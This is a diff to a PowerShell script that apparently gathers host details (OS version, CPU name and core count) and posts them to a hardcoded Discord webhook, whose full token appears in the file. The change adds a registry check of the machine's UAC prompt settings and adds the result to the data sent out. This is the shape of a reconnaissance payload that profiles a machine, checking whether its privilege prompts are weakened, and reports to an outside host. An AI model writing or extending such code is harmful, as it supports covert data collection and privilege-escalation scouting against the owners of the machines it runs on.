@@ -26,6 +26,24 @@ $osVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Curren
 
 sleep 2
 
+
+# Path to the registry key containing the UAC settings
+$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+
+# Retrieve both EnableLUA and ConsentPromptBehaviorAdmin values
+try {
+    $uacSettings = Get-ItemProperty -Path $registryPath -Name "EnableLUA", "ConsentPromptBehaviorAdmin" -ErrorAction Stop
+
+    if ($uacSettings.EnableLUA -eq 1 -and $uacSettings.ConsentPromptBehaviorAdmin -eq 2) {
+        $rslt = "Maximum UAC enabled"
+    } else {
+        $rslt = "Maximum UAC - FALSE"
+    }
+} catch {
+    $rslt = "Could not read UAC settings."
+}
+
+
 # Define the Discord webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1285453590428782614/2ICVsBAPEUQjq3aCyFPX9ce6WexTwa29I1FddkY5ZuTql0_efW5EguYXiAyCvsMrX7i2"
 
@@ -39,6 +57,7 @@ $payload = @{
 **CPU:** $($cpu.Name)
 **CPU Cores:** $($cpu.NumberOfCores)
 **OS:** $osVersion
+**UAC:** $rslt
 ================================
 "@
 } | ConvertTo-Json
